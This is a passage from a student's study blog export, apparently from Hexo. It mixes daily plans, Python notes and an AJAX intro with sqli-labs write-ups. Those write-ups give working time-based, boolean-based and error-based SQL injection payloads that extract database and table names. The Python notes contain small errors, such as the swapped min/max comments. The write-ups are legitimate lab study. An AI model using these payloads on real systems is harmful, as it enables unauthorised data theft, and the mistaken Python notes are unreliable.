<tr>
<td>上床</td>
<td>0：00</td>
</tr>
</tbody></table>
<h2 id="2020-02-16总结"><a href="#2020-02-16总结" class="headerlink" title="2020-02-16总结"></a>2020-02-16总结</h2><p>早上起床听了会六级听力。接着把python的书看完了，明天准备试着跟着步骤开始一个项目。然后就是把dvwa的command injection做好了。缺点的话就是数学通识没听，书也没看。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php stristr函数[搜索字符串]</title>
    <url>/2020/02/16/php-stristr%E5%87%BD%E6%95%B0-%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h3 id="stristr-string-search-before-search-："><a href="#stristr-string-search-before-search-：" class="headerlink" title="stristr(string,search,before_search) ："></a>stristr(string,search,before_search) ：</h3><p>搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE</p>
<p>string    必需。规定被搜索的字符串<br>search    必需。规定要搜索的字符串，如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符<br>before_search    可选。默认值为 “false” 的布尔值<br>如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分</p>
<p>注释：该函数是二进制安全的<br>注释：该函数是不区分大小写的，如需进行<strong>区分大小写</strong>的搜索，请使用 <strong>strstr()</strong> 函数</p>
]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-16日目标</title>
    <url>/2020/02/15/2020-02-16%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-16日目标"><a href="#2020-02-16日目标" class="headerlink" title="2020-02-16日目标"></a>2020-02-16日目标</h2><table>
<thead>
<tr>
<th>起床</th>
<th>9：00</th>
</tr>
</thead>
<tbody><tr>
<td>python</td>
<td>10：00-12：00</td>
</tr>
<tr>
<td>dvwa</td>
<td>15：00-16：30</td>
</tr>
<tr>
<td>看看书，数学通识</td>
<td>16：30-dinner</td>
</tr>
<tr>
<td>python</td>
<td>19：30-21：30</td>
</tr>
<tr>
<td>上床</td>
<td>0：00</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-14日目标</title>
    <url>/2020/02/13/2020-02-14%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-14日目标"><a href="#2020-02-14日目标" class="headerlink" title="2020-02-14日目标"></a>2020-02-14日目标</h2><table>
<thead>
<tr>
<th>9：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>10：00-12：00</td>
<td>python</td>
</tr>
<tr>
<td>12：00-lunchtime</td>
<td>看看书，数学通识</td>
</tr>
<tr>
<td>15：30-17：00</td>
<td>DVWA</td>
</tr>
<tr>
<td>19：30-21：30</td>
<td>python</td>
</tr>
<tr>
<td>00：30</td>
<td>睡觉</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-13日目标</title>
    <url>/2020/02/12/2020-02-13%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-13日目标"><a href="#2020-02-13日目标" class="headerlink" title="2020-02-13日目标"></a>2020-02-13日目标</h2><table>
<thead>
<tr>
<th>起床</th>
<th>9:00</th>
</tr>
</thead>
<tbody><tr>
<td>python</td>
<td>10:00-12:00</td>
</tr>
<tr>
<td>看看书，数学通识</td>
<td>—lunchtime</td>
</tr>
<tr>
<td>sqli-labs 9-10</td>
<td>15：00-16：00</td>
</tr>
<tr>
<td>php</td>
<td>16：30-17：30</td>
</tr>
<tr>
<td>python</td>
<td>19：30-21：30</td>
</tr>
<tr>
<td>睡觉</td>
<td>12：30</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>python代码规范</title>
    <url>/2020/02/12/python%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<ol>
<li><p>缩进用4个空格</p>
</li>
<li><p>行长不超过80字符</p>
</li>
<li><p>合理安排空行</p>
</li>
<li><p>在诸如== 、&gt;= 和&lt;= 等比较运算符两边各添加一个空格</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if age &gt; 4:    &#x2F;&#x2F;TRUE</span><br><span class="line">if age&lt;4:      &#x2F;&#x2F;FALSE</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于较长的print语句，可以将语句的第一部分跟在print右边，其余换行。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;Sarah&#39;s favorite language is &quot; + </span><br><span class="line">    favorite_languages[&#39;sarah&#39;].title() + </span><br><span class="line">    &quot;.&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>千万千万注意要习惯用四个空格而不用tab！！！</p>
</li>
<li><p>在类中，可使用一个空行来分隔<strong>方法</strong>；而在模块中，可使用两个空行来分隔<strong>类</strong>。</p>
</li>
<li><p>需要同时导入标准库中的模块和你编写的模块时，先编写导入标准库模块的import 语句，再添加一个空行，然后编写导入你自己编写的模块的import 语句。在包含多 条import 语句的程序中，这种做法让人更容易明白程序使用的各个模块都来自何方。 </p>
</li>
<li><p><strong>类名应采用驼峰命名法</strong> ，即将类名中的每个单词的首字母都大写，而不使用下划线。<strong>实例名和模块名都采用小写格式，并在单词之间加上下划线。</strong></p>
</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>代码规范</tag>
      </tags>
  </entry>
  <entry>
    <title>python2与python3的一些区别</title>
    <url>/2020/02/12/python2%E4%B8%8Epython3%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h3 id="print语句"><a href="#print语句" class="headerlink" title="print语句"></a>print语句</h3><ol>
<li>python2中print语句有些包含括号，有些不含。</li>
<li>python3中print是一个函数，因此括号必不可少。</li>
</ol>
<h3 id="input"><a href="#input" class="headerlink" title="input()"></a>input()</h3><ol>
<li>python3中获取用户输入是input()</li>
<li>python2.7里则是raw_input(),在此版本中input()将用户输入解读为代码。</li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python注意事项</title>
    <url>/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    <content><![CDATA[<ol>
<li><p>如要在字符串中使用引号，则包裹字符串要用双引号，单引号不可。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;George&#39;s personality is very optimistic!&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>变量打印时如要换行要用加号，与c语言有差别。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(name + &quot;\n\t&quot;)   &#x2F;&#x2F;python</span><br><span class="line">printf(&quot;&amp;d\n\t&quot;,name)    &#x2F;&#x2F;C语言</span><br></pre></td></tr></table></figure>
</li>
<li><p>str()函数将非字符串转为字符串以正常打印。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age &#x3D; 23 </span><br><span class="line">message &#x3D; &quot;Happy &quot; + str(age) + &quot;rd Birthday!&quot; </span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure>
</li>
<li><p>列表中name[-1]可访问最后一个元素。</p>
</li>
<li><p>变量，列表值都不要加双引号，加了引号代表字符串，直接字面打印其中内容。</p>
</li>
<li><p>在对列表进行增删时一定要注意一个顺序性，即你如果删除了name[0]，原来的name[1]就变成了name[0]。</p>
</li>
<li><p>字典里哪怕嵌套的是字典，第一个字典内都要用冒号，而非等号；而且每一个键-值后记得加逗号！<img src="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/1.png" alt="1"></p>
</li>
<li><p>遍历字典的键-值时，一定要记得加.item()</p>
</li>
<li><p>如果想引用特定函数（from。。。import。。。），要在不想引用部分加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br></pre></td></tr></table></figure>
</li>
<li><pre><code>import xxx</code></pre><p>时，在引用类的时候记得要用   xxx.方法/属性！</p>
<p><img src="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/2.png" alt="2"></p>
</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python的一些简单方法</title>
    <url>/2020/02/12/python%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h3 id="去除空白"><a href="#去除空白" class="headerlink" title="去除空白"></a>去除空白</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rstrip()   &#x2F;&#x2F;去除尾部空白</span><br><span class="line">lstrip()   &#x2F;&#x2F;去除头部空白</span><br><span class="line">strip()    &#x2F;&#x2F;去除头尾空白</span><br></pre></td></tr></table></figure>



<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name.title()   &#x2F;&#x2F;首字母大写</span><br><span class="line">name.upper()   &#x2F;&#x2F;全部大写</span><br><span class="line">name.lower()   &#x2F;&#x2F;全部小写</span><br></pre></td></tr></table></figure>



<h3 id="对列表的插入与删除"><a href="#对列表的插入与删除" class="headerlink" title="对列表的插入与删除"></a>对列表的插入与删除</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name.append(&#39;a&#39;)   &#x2F;&#x2F;在列表末尾添加元素a</span><br><span class="line">name.insert(0,&#39;a&#39;) &#x2F;&#x2F;在列表0位置添加元素a</span><br><span class="line">del name[0]        &#x2F;&#x2F;删除列表0位置元素</span><br></pre></td></tr></table></figure>

<h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;]  </span><br><span class="line">print(motorcycles) </span><br><span class="line"></span><br><span class="line">popped_motorcycle &#x3D; motorcycles.pop()</span><br><span class="line">print(motorcycles) </span><br><span class="line">print(popped_motorcycle)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;] </span><br><span class="line">suzuki</span><br></pre></td></tr></table></figure>

<p>pop中添加数字即可添加元素到任何位置</p>
<h4 id="根据值删除元素"><a href="#根据值删除元素" class="headerlink" title="根据值删除元素"></a>根据值删除元素</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;]  print(motorcycles) </span><br><span class="line">too_expensive &#x3D; &#39;ducati&#39; </span><br><span class="line"></span><br><span class="line">motorcycles.remove(too_expensive)  </span><br><span class="line">print(motorcycles) </span><br><span class="line">print(&quot;\nA &quot; + too_expensive.title() + &quot; is too expensive for me.&quot;)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">A Ducati is too expensive for me.</span><br></pre></td></tr></table></figure>



<h3 id="组织列表"><a href="#组织列表" class="headerlink" title="组织列表"></a>组织列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list.sort()   &#x2F;&#x2F;对列表进行永久性排序（a-z）</span><br><span class="line">list.sort(reverse&#x3D;true)   &#x2F;&#x2F;对列表进行永久性倒叙排序（z-a）</span><br><span class="line">sorted(list)   &#x2F;&#x2F;对列表进行临时性排序</span><br><span class="line"></span><br><span class="line">list.reverse()   &#x2F;&#x2F;倒着打印列表(这玩意有点奇妙，你不能把它放print里面，像print(list.reverse())</span><br><span class="line"></span><br><span class="line">len(list)   &#x2F;&#x2F;获取列表的长度(记得打印)</span><br></pre></td></tr></table></figure>



<h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">range(start_num,finish_num,step)</span><br><span class="line">list()   &#x2F;&#x2F;将括号内转化为列表</span><br></pre></td></tr></table></figure>



<h3 id="处理一堆数字的列表"><a href="#处理一堆数字的列表" class="headerlink" title="处理一堆数字的列表"></a>处理一堆数字的列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">min()   &#x2F;&#x2F;最大值</span><br><span class="line">max()   &#x2F;&#x2F;最小值</span><br><span class="line">sum()   &#x2F;&#x2F;总和</span><br></pre></td></tr></table></figure>



<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set()    &#x2F;&#x2F;去除其中重复值</span><br></pre></td></tr></table></figure>



<h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name.split()    &#x2F;&#x2F;以空格为界限，把字符串分割成若干块并放入列表</span><br></pre></td></tr></table></figure>



<h3 id="判断字符类型"><a href="#判断字符类型" class="headerlink" title="判断字符类型"></a>判断字符类型</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isinstance(string,type)    &#x2F;&#x2F;判断string是否是type类型，返回布尔值</span><br><span class="line">isdigit(string)            &#x2F;&#x2F;判断字符串是否为数字</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-12日目标</title>
    <url>/2020/02/12/2020-02-12%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-12"><a href="#2020-02-12" class="headerlink" title="2020-02-12"></a>2020-02-12</h2><table>
<thead>
<tr>
<th>10：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>10：30-12：00</td>
<td>python</td>
</tr>
<tr>
<td>12：00-lunchtime</td>
<td>数学通识+看看书</td>
</tr>
<tr>
<td>15：00-16：00</td>
<td>sql-labs 9-10</td>
</tr>
<tr>
<td>18：30-20：30</td>
<td>python</td>
</tr>
<tr>
<td></td>
<td>php</td>
</tr>
<tr>
<td></td>
<td>上床</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>sql时间型注入</title>
    <url>/2020/02/11/sql%E6%97%B6%E9%97%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>今天遇到了sql时间型注入，大致总结一下，其实和布尔型注入非常相似，只不过利用了sleep（）函数对网页延迟的影响来判断正误。</p>
<p>比如判断是否存在漏洞时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and sleep(5)--+</span><br></pre></td></tr></table></figure>

<p>判断数据库长度时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(length(database())&#x3D;8,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

<p>判断数据库字母时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(ascii(substr((select database()),1,1))&gt;113,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-11日目标</title>
    <url>/2020/02/11/2020-02-11%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-11日目标"><a href="#2020-02-11日目标" class="headerlink" title="2020-02-11日目标"></a>2020-02-11日目标</h2><ol>
<li>sqli-labs往后做</li>
<li>python的书看起来</li>
<li>数学通识2-3</li>
<li>单词20个</li>
<li>听力10min</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>sql布尔型注入</title>
    <url>/2020/02/10/sql%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>做到了sqli-labs的第六题，其实对比第五题只要改成了“即可，但是网上介绍了一种新的方法叫布尔型注入，这种方法emmm有点麻烦不太方便，但是容易理解，也多了解一条路子嘛。</p>
<p>总结一下来说，布尔型注入就是构造条件句，然后通过页面是否返回内容来判断构造条件是否满足。</p>
<p>比如一开始爆库名时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr(database(),1,1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure>

<p>利用不停改变a确定数据库第一个字母的值（可用二分法），接着爆出数据库名的长度，例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and length(database())&#x3D;&#39;8&#39;</span><br></pre></td></tr></table></figure>

<p>然后一个字母一个字母爆出整个库名</p>
<p>接着爆出表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,1)&#x3D;&#39;u&#39;</span><br></pre></td></tr></table></figure>

<p>limit 3,1 代表数据库里第4张表（第一张表是0）</p>
<p>如果大致能确定出表名，可这样确认猜测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,5)&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>



<p>接下来的原理类似就不赘述。总之这种办法比较累人，不到万不得已建议还是用报错型注入。</p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-10日目标</title>
    <url>/2020/02/09/2020-02-10%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-10日目标"><a href="#2020-02-10日目标" class="headerlink" title="2020-02-10日目标"></a>2020-02-10日目标</h2><ol>
<li>英语听力10min</li>
<li>单词20个</li>
<li>数学通识2-3</li>
<li>sqli-labs继续刷</li>
<li>刷道wechall</li>
<li>开始接触python</li>
</ol>
<h2 id="2020-02-09总结"><a href="#2020-02-09总结" class="headerlink" title="2020-02-09总结"></a>2020-02-09总结</h2><p>讲真，今天一天，都在忙sqli-labs的less5，从一开始看答案的一脸懵逼，到后来一步步拆解分析，再到晚上甚至对答案提出了质疑，之后再深入思考又发现我质疑的点有不严密的地方，但是其中有一个点完全是答案可以改善的，也在原作者博客下评论了，希望那位大佬能注意到。总之，很奇妙的感觉，就像是思维的一场碰撞，不仅限于我和别人，也可以是现在的自己和以前的自己。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>sql报错型注入</title>
    <url>/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="对于原作者代码地理解"><a href="#对于原作者代码地理解" class="headerlink" title="对于原作者代码地理解"></a>对于原作者代码地理解</h2><p>今天做了sqli-labs的less5，第一次遇到这种报错型注入，就想好好研究下。</p>
<p>先来看这一段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x) as a)--+</span><br></pre></td></tr></table></figure>

<p>第一眼看到的时候就懵了，然后想慢慢拆解下来看。我先把它放到word里，然后把每个括号都标上不同的序号和颜色：</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
<p>然后一段段看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. (select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1)</span><br></pre></td></tr></table></figure>

<p>这一段代表从表information_schema.schemata中提取schema_name字段的第一个记录数并在其后加上分号”;”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. floor(rand()*2)</span><br></pre></td></tr></table></figure>

<p>rand()代表在0-1之间取随机数，而rand()*2则表示在0-2之间取随机数，floor代表取整，合在一起就代表在随机取0或1.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. concat(1., 2.) as x</span><br></pre></td></tr></table></figure>

<p>代表将1.与2.连接并填写入一个新的字段x中。例如test0与test1填写到x字段中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4. (select count(*),3. from information_schema.tables group by x)</span><br></pre></td></tr></table></figure>

<p>3.中的字符已确定，此串代码的意思是统计出information_schema.tables表中的行数，并给每一行的数据随机分配一个“名字”（test0，test1）。</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
<p><strong>注：重点来了重点来了！</strong></p>
<p>如果仅仅是这样，你可能会问，这不很正常嘛，哪里有错误回显？</p>
<p>别急，如果我把这段代码原封不动再打一遍，可能会出现如下情况：</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
<p>仔细观察发现两次输入完全一样，但为什么会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Duplicate entry &#39;information_schema0&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>

<p>这个要理解透彻对我有些难度，需要理解数据库一些语句的运行机制。</p>
<p>在网上搜到了一篇不错的理解：<a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">点我</a></p>
<p>我大概转述一下他的意思：</p>
<p>我们先假设floor(rand()*2)函数连续五次的取值为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0，1，1，0，1</span><br></pre></td></tr></table></figure>

<p>刚开始的时候虚拟表是空的</p>
<table>
<thead>
<tr>
<th>count（*）</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>扫描原始表第一项时，第一次计算取到了information_schema0，到x里寻找显然没有，于是要将它插入表中。</p>
<p><strong>但要记住！在插入之前会进行第二次计算</strong>，这时x的值就变成了information_schema1，于是乎表就变成了</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>information_schema1</td>
</tr>
</tbody></table>
<p>扫描原始表第二项时，得到information_schema1，到x里寻找能找到，于是乎表变成了</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>information_schema1</td>
</tr>
</tbody></table>
<p>接着扫描原始表第三项，计算得到information_schema0，到x里寻找显然没有，于是要将它插入表中，进行第二次计算得到information_schema1。</p>
<p>这时数据表就一脸懵逼，不是有了information_schema1嘛，于是它就报错。也就通过错误回显得到了我们想要的信息。</p>
<blockquote>
<p>还要注意一点，如果想要稳定地报错，可以使用rand（0）.</p>
</blockquote>
<p>到这里有人可能还会疑惑，这不就已经能错误回显了吗，为什么前面还会有select1</p>
<p>我们再仔细看这个代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+</span><br></pre></td></tr></table></figure>

<p>id=2‘ 和后面连接用的是and，如果没有select1，会发现两部分没有交集，无法成立，也就看不到回显了。</p>
<h2 id="对原作者码地质疑"><a href="#对原作者码地质疑" class="headerlink" title="对原作者码地质疑"></a>对原作者码地质疑</h2><p>按照原作者的意思这段码用<code>limit0，1</code>改变第一个数字的值而不断爆出数据库名</p>
<p>他给出了以下解释</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/4.png" alt="4"></p>
<p>其实我不了解group_concat()函数最大的字节数什么的，但经过测试我发现问题在于rand()应该改为rand(0)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor (rand(0)*2)) as x from information_schema.tables group by x) as a) --+</span><br></pre></td></tr></table></figure>

<p>这段代码完全可以爆出所有的库名</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/5.png" alt="5"></p>
<p>至于不加0为什么会得到</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/6.png" alt="6"></p>
<p>因为and后的语句查询结果为</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/7.png" alt="7"></p>
<p>而and前只有一行，后面的语句超过了一行所以报错。</p>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>再仔细一想，是我的问题，因为虽然可以爆出部分库名，但因为字节的限制不能显示所有库名，但rand（0）的改进没有任何问题！</p>
<p>所有最后代码就变成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-08日目标</title>
    <url>/2020/02/07/2020-02-08%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-08日目标"><a href="#2020-02-08日目标" class="headerlink" title="2020-02-08日目标"></a>2020-02-08日目标</h2><ol>
<li>英语听力10min</li>
<li>数学通识2-3篇</li>
<li>英语单词20个</li>
<li>sqli-labs往后刷题</li>
<li>http协议最后一章带着看</li>
<li>如果有时间可以开始肝python了</li>
</ol>
<h2 id="2020-02-07总结"><a href="#2020-02-07总结" class="headerlink" title="2020-02-07总结"></a>2020-02-07总结</h2><p>今天先学完了AJAX，之后上wechall刷了两道题，通过regex那题又温习了一遍正则表达式，明天要早起了不能这么浑浑噩噩了！哦对，还看了本书《呼啸山庄》，讲真，最后结尾有点没看懂。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>AJAX基础</title>
    <url>/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>AJAX = 异步 JavaScript 和 XML。</p>
<p>AJAX 是一种用于创建快速动态网页的技术。</p>
<p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现<strong>异步更新</strong>。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<p>传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。</p>
<p>有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。</p>
<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/1.png" alt="1"></p>
<h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>先放一段完整的代码感受下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function loadXMLDoc()</span><br><span class="line">&#123;</span><br><span class="line">	var xmlhttp;</span><br><span class="line">	if (window.XMLHttpRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; IE6, IE5 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">	&#123;</span><br><span class="line">		if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">           document.getElementById(&quot;myDiv&quot;).innerHTML&#x3D;xmlhttp.responseText;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	xmlhttp.open(&quot;GET&quot;,&quot;&#x2F;try&#x2F;ajax&#x2F;ajax_info.txt&quot;,true);</span><br><span class="line">	xmlhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span 